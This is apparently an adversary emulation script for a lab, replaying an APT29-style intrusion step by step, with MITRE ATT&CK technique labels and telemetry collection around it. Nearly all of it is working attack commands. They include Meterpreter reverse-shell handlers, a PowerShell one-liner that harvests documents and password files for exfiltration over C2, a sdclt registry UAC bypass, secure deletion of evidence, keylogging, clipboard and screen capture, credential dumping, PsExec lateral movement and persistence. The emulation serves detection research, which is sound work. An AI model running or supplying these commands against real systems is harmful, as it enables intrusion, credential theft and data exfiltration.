#################################### scenario description ####################################
# Attacker-Kali runs as C2 server.
# Attacker-UbuntuServer20 runs as Proxy.
#################################### scenario description ####################################

#################################### scenario setup ####################################
# On Attacker-Kali
ssh Attacker-Kali -t "sudo systemctl start apache2"
# On Win10Workstation1 and Win10Workstation2
echo "Turn on 'network and file sharing' on Win10Workstation2 "
#################################### scenario setup ####################################

#################################### data collection start ####################################
./dataCollection.sh "-h" "Win10Workstation1" "-a" "start" "-g" "apt29" "-s" "1" 
./dataCollection.sh "-h" "Win10Workstation2" "-a" "start" "-g" "apt29" "-s" "1" 
./dataCollection.sh "-h" "DomainController" "-a" "start" "-g" "apt29" "-s" "1" 
#################################### data collection start ####################################

#################################### scenario start ####################################
# Preparation on Attacker-Kali
ssh Attacker-Kali
msfconsole
# use exploit/multi/handler & set payload windows/x64/meterpreter/reverse_tcp & set LHOST 10.0.3.102 & set LPORT 1234 & exploit
handler -H 0.0.0.0 -P 1234 -p windows/x64/meterpreter/reverse_tcp

# Step 1 - Initial Breach
# Victim emulation
echo "PLEASE LOG INTO THE VICTIM MACHINE WITH THE CORRESPONDING USER AND CLICK THE WORD DOCUMENT UNDER Downloads FOLDER: 3aka3.doc!" 
# The follwoing techniques are executed by the one click above.
# User Execution: Malicious File (T1204.002) - Execution
# Masquerading: Right-to-Left Override (T1036.002) - Defense Evasion
# Non-Standard Port (T1571) - Command and Control
# Command and Scripting Interpreter: Windows Command Shell (T1059.003) - Execution
sessions & sessions -i 1
shell
# Command and Scripting Interpreter: PowerShell (T1059.001) - Execution
powershell

# Step 2 - Rapid Collection and Exfiltration
# File and Directory Discovery (T1083) - Discovery
# Automated Collection (T1119) - Collection
# Archive Collected Data: Archive via Utility (T1560.001) - Collection
$env:APPDATA;$files=ChildItem -Path $env:USERPROFILE\ -Include *.doc,*.xps,*.xls,*.ppt,*.pps,*.wps,*.wpd,*.ods,*.odt,*.lwp,*.jtd,*.pdf,*.zip,*.rar,*.docx,*.url,*.xlsx,*.pptx,*.ppsx,*.pst,*.ost,*psw*,*pass*,*login*,*admin*,*sifr*,*sifer*,*vpn,*.jpg,*.txt,*.lnk -Recurse -ErrorAction SilentlyContinue | Select -ExpandProperty FullName; Compress-Archive -LiteralPath $files -CompressionLevel Optimal -DestinationPath $env:APPDATA\Draft.Zip -Force
exit
exit
# Exfiltration Over C2 Channel (T1041) - Exfiltration
download "C:\Users\du1\AppData\Roaming\Draft.Zip" "/home/kali/Downloads/apt29/"

# Step 3 - Deploy Stealth Toolkit
# OPEN ANOTHER TERMINAL TAB
ssh Attacker-Kali & msfconsole & handler -H 0.0.0.0 -P 443 -p windows/x64/meterpreter/reverse_https
# BACK TO THE PREVIOUS TERMINAL TAB
# Ingress Tool Transfer (T1105) - Command and Control
upload "/home/kali/Downloads/apt29/meterpreterHttps.exe" "C:\Users\du1\Downloads\Https.exe"
shell
powershell
# Abuse Elevation Control Mechanism: Bypass User Access Control (T1548.002)  Privilege Escalation
New-Item -Path HKCU:\Software\Classes\Folder\shell\open -Name command -Force
Set-ItemProperty -Path "HKCU:\Software\Classes\Folder\shell\open\command" -Name "(Default)" "C:\Users\du1\Downloads\Https.exe"
Set-ItemProperty -Path "HKCU:\Software\Classes\Folder\shell\open\command" -Name "DelegateExecute" "" -Force
exit 
%windir%\system32\sdclt.exe
powershell
# Modify Registry (T1112) - Defense Evasion
Remove-Item -Path HKCU:\Software\Classes\Folder* -Recurse -Force
exit
exit

# Step 4 - Defense Evasion and Discovery 
# SWITCH TO THE SECOND TERMINAL TAB (which received a high integrity Meterpreter callback)
sessions & sessions -i 1
# Ingress Tool Transfer (T1105) - Command and Control
upload "/home/kali/Downloads/apt29/SysinternalsSuite.zip" "C:\Users\du1\Downloads\SysinternalsSuite.zip"
execute -f powershell.exe -i -H
# Deobfuscate/Decode Files or Information (T1140) - Defense Evasion
'  Expand-Archive -LiteralPath "$env:USERPROFILE\Downloads\SysinternalsSuite.zip" -DestinationPath "$env:USERPROFILE\Downloads\"  '
if (-Not (Test-Path -Path "C:\Program Files\SysinternalsSuite")) { Move-Item -Path $env:USERPROFILE\Downloads\SysinternalsSuite -Destination "C:\Program Files\SysinternalsSuite" }
'  cd "C:\Program Files\SysinternalsSuite\"   '
# Process Discovery (T1057) - Discovery
Get-Process
Stop-Process -name *3aka3* -Force
# Indicator Removal on Host: File Deletion (T1070.004) - Defense Evasion
.\sdelete64.exe /accepteula "$env:APPDATA\Draft.Zip"
.\sdelete64.exe /accepteula "$env:USERPROFILE\Downloads\SysinternalsSuite.zip"
Move-Item .\readme.txt readme.ps1
Set-ExecutionPolicy bypass
. .\readme.ps1
# Discovery (T1016, T1033, T1518.001, T1069, T1082, T1083)
# Native API (T1106) - Execution
Invoke-Discovery

# Step 5 - Persistence
# Create or Modify System Process: Windows Service (T1543.003) -  Persistence
Invoke-Persistence -PersistStep 1
# Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder (T1547.001) -  Persistence
Invoke-Persistence -PersistStep 2

# Step 6 - Credential Access
# Credentials from Password Stores: Credentials from Web Browsers (T1555.003) - Credential Access
& "C:\Program Files\SysinternalsSuite\accesschk.exe"
# Unsecured Credentials: Private Keys (T1552.004) - Credential Access
Get-PrivateKeys
exit
# OS Credential Dumping: Security Account Manager (T1003.002) - Credential Access
run post/windows/gather/credentials/credential_collector

# Step 7 - Collection and Exfiltration
execute -f powershell.exe -i -H
cd "C:\Program Files\SysinternalsSuite"
Move-Item .\psversion.txt psversion.ps1
. .\psversion.ps1
# Screen Capture (T1113) - Collection
Invoke-ScreenCapture;Start-Sleep -Seconds 3;View-Job -JobName "Screenshot"
echo "PLEASE LOG INTO THE VICTIM MACHINE WITH THE CORRESPONDING USER AND COPY SOME TEXT TO CLIPBOARD"
# Clipboard Data (T1115) - Collection
Get-Clipboard
# Input Capture: Keylogging (T1056.001) - Collection
Keystroke-Check
Get-Keystrokes;Start-Sleep -Seconds 15;View-Job -JobName "Keystrokes"
echo "PLEASE LOG INTO THE VICTIM MACHINE WITH THE CORRESPONDING USER AND TYPE 'Hi John, how are you today?'"
View-Job -JobName "Keystrokes"
Remove-Job -Name "Keystrokes" -Force
Remove-Job -Name "Screenshot" -Force
#  Compression and Exfiltration (T1048, T1002, T1560.001)
Invoke-Exfil

# Step 8 - Lateral Movement
echo "PLEASE LOG INTO THE SECOND VICTIM MACHINE WITH THE CORRESPONDING USER AND DO NOTHING"
# Remote System Discovery (T1018) - Discovery
Ad-Search Computer Name *
# Remote Services: Windows Remote Management (T1021.006)
Invoke-Command -ComputerName DESKTOP-G3MEF77 -ScriptBlock { Get-Process -IncludeUserName | Select-Object UserName,SessionId | Where-Object { $_.UserName -like "*\$env:USERNAME" } | Sort-Object SessionId -Unique } | Select-Object UserName,SessionId
# SWITCH TO THE FIRST TERMINAL TAB (whose Meterpreter callback was terminated)
jobs & jobs -k 0
handler -H 0.0.0.0 -P 8443 -p windows/x64/meterpreter/reverse_tcp
# SWITCH TO THE SECOND TERMINAL TAB (with the high integrity Meterpreter callback)
# Ingress Tool Transfer (T1105) - Command and Control
Invoke-SeaDukeStage -ComputerName DESKTOP-G3MEF77
# System Services: Service Execution (T1569.002) - Execution
echo "CHANGE THE VALUE OF SESSION NUMBER MANUALLY IF NEEDED!" 
.\PsExec64.exe -accepteula \\DESKTOP-G3MEF77 -u "EMULATIONTARGET\du1" -p "yourownpass" -i 2 "C:\Windows\Temp\python.exe"

# Step 9 - Collection
# SWITCH TO THE FIRST TERMINAL TAB (with the new Meterpreter callback)
sessions & sessions -i 2
# Ingress Tool Transfer (T1105) - Command and Control
upload "/home/kali/Downloads/apt29/rar.exe" "C:\\Windows\\Temp\\Rar.exe"
upload "/home/kali/Downloads/apt29/sdelete64.exe" "C:\\Windows\\Temp\\sdelete64.exe"
# Data from Local System (T1005) - Collection
execute -f powershell.exe -i -H
$env:APPDATA;$files=ChildItem -Path $env:USERPROFILE\ -Include *.doc,*.xps,*.xls,*.ppt,*.pps,*.wps,*.wpd,*.ods,*.odt,*.lwp,*.jtd,*.pdf,*.zip,*.rar,*.docx,*.url,*.xlsx,*.pptx,*.ppsx,*.pst,*.ost,*psw*,*pass*,*login*,*admin*,*sifr*,*sifer*,*vpn,*.jpg,*.txt,*.lnk -Recurse -ErrorAction SilentlyContinue | Select -ExpandProperty FullName; Compress-Archive -LiteralPath $files -CompressionLevel Optimal -DestinationPath $env:APPDATA\working.zip -Force
cd C:\Windows\Temp
# Archive Collected Data: Archive via Utility (T1560.001) - Collection
.\rar.exe a -hpfGzq5yKw "$env:USERPROFILE\Desktop\working.zip" "$env:APPDATA\working.zip"
exit
# Exfiltration Over C2 Channel (T1041) - Exfiltration
download "C:\\Users\\du1\\Desktop\\working.zip" "/home/kali/Downloads/apt29/"
# Indicator Removal on Host: File Deletion (T1070.004) - Defense Evasion
shell 
cd "C:\Windows\Temp"
.\sdelete64.exe /accepteula "C:\Windows\Temp\Rar.exe"
.\sdelete64.exe /accepteula "C:\Users\du1\AppData\Roaming\working.zip"
.\sdelete64.exe /accepteula "C:\Users\du1\Desktop\working.zip"
cd "C:\Windows"
del "C:\Windows\Temp\sdelete64.exe"
exit & exit & exit

# Step 10 - Persistence Execution
# SWITCH TO THE SECOND TERMINAL TAB (with the high integrity Meterpreter callback)
query session & logoff 
exit
# System Services: Service Execution (T1569.002) - Execution
# Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder (T1547.001) - Persistence
echo "PLEASE LOG INTO THE VICTIM MACHINE WITH THE CORRESPONDING USER AND REBOOT THE MACHINE."
sessions & sessions -i 2 & shell & whoami /all & exit & exit 
sessions -i 3 & shell & whoami /all & exit & exit & exit 
#################################### scenario end ####################################

#################################### data collection end ####################################
./dataCollection.sh "-h" "Win10Workstation1" "-a" "stop" "-g" "apt29" "-s" "1" 
./dataCollection.sh "-h" "Win10Workstation2" "-a" "stop" "-g" "apt29" "-s" "1" 
./dataCollection.sh "-h" "DomainController" "-a" "stop" "-g" "apt29" "-s" "1" 
#################################### data collection end ####################################

#################################### scenario cleanup ####################################
# On Win10Workstation1 and Win10Workstation2
ssh Target-Win10Workstation1du1 -t 'del %userprofile%\Downloads\Https.exe & rmdir /s /q "C:\Program Files\SysinternalsSuite" & del "C:\Windows\System32\javamtsup.exe" & sc.exe delete javamtsup & reg delete "HKLM\SOFTWARE\Javasoft" /f & del "C:\Windows\System32\hostui.exe" & del "C:\Windows\System32\hostui.bat" & del "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\hostui.lnk"'
ssh Target-Win10Workstation2du1 -t 'del "C:\Windows\Temp\python.exe"'
#################################### scenario cleanup ####################################

